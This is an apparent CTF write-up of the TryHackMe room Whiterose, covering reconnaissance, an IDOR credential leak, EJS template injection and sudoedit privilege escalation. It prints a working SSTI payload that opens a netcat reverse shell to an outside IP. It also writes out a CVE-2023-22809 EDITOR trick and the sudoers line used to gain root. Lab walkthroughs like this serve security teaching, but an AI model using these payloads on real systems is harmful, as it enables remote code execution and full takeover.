---
title: Whiterose
description: Writeup for the TryHackMe machine Whiterose
date: 2024-10-30
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds two open ports: SHH (22) and HTTP (80).
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

### Subdomain Fuzz

The web server redirects to `cyprusbank.thm`. Fuzzing for subdomains reveals `admin.cyprusbank.thm`:
```console
$ gobuster vhost -u http://cyprusbank.thm/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain --timeout 60s
[...]
Found: admin.cyprusbank.thm Status: 302 [Size: 28] [--> /login]
```

### cyprusbank.thm - TCP 80

The site displays a maintenance page. Directory brute-forcing with `gobuster` returns no results.

### admin.cyprusbank.thm - TCP 80

The site redirects to `/login`. The login page is for managers and admins. Running `gobuster` only uncovers paths already visible in the navigation bar:
```console
$ gobuster dir -u "http://admin.cyprusbank.thm/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 404,404 -t 200 --timeout 40s -k  
/search               (Status: 302) [Size: 28] [--> /login]
/login                (Status: 200) [Size: 2195]
/Search               (Status: 302) [Size: 28] [--> /login]
/Login                (Status: 200) [Size: 2195]
/messages             (Status: 302) [Size: 28] [--> /login]
/logout               (Status: 302) [Size: 28] [--> /login]
/settings             (Status: 302) [Size: 28] [--> /login]
/Logout               (Status: 302) [Size: 28] [--> /login]
/Messages             (Status: 302) [Size: 28] [--> /login]
/SEARCH               (Status: 302) [Size: 28] [--> /login]
/SETTINGS             (Status: 302) [Size: 28] [--> /login]
```
The `X-Powered-By` header reveals that the site is built with Express, a Node.js framework.

## Shell as web

The credentials `Olivia Cortez:olivi8` from the room description work on the login page.

As Olivia, I can't access `/settings`. Accessing `/messages` reveals a chat app. Testing the `c` parameter for an IDOR vulnerability is successful. The chat at `http://admin.cyprusbank.thm/messages/?c=0` contains the credentials `Gayle Bev:<REDACTED>`.

As Gyle Bev I can view the phone numbers and answer the first question. Additionally, I now have access to `/settings`, where customer passwords can be changed. The password value is reflected in the response, which suggested potential XSS or SSTI. Intercepting the request in Burp Suite and sending only a username triggers a server error, which reveals the usage of `.ejs` files.

Searching for EJS and SSTI exploits returns CVE-2022-29078 and the following [PoC](https://eslam.io/posts/ejs-server-side-template-injection-rce/):
```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.x.x.x 9001 -e /bin/bash');//
```

## Shell as root

The user `web` can execute `sudoedit` without a password as `root`.
```console
$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
The installed `sudo` version is `1.9.12p1`:
```console
$ sudoedit --version 
sudoedit --version
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```
This version is vulnerable to CVE-2023-22809. Exploitation is straightforward:
```console
$ export EDITOR="nano -- /etc/sudoers"
$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
In the editor, I append:
```
web ALL=(ALL:ALL) NOPASSWD: ALL
```
Saving the file allowed me to escalate privileges:
```console
$ sudo su
```
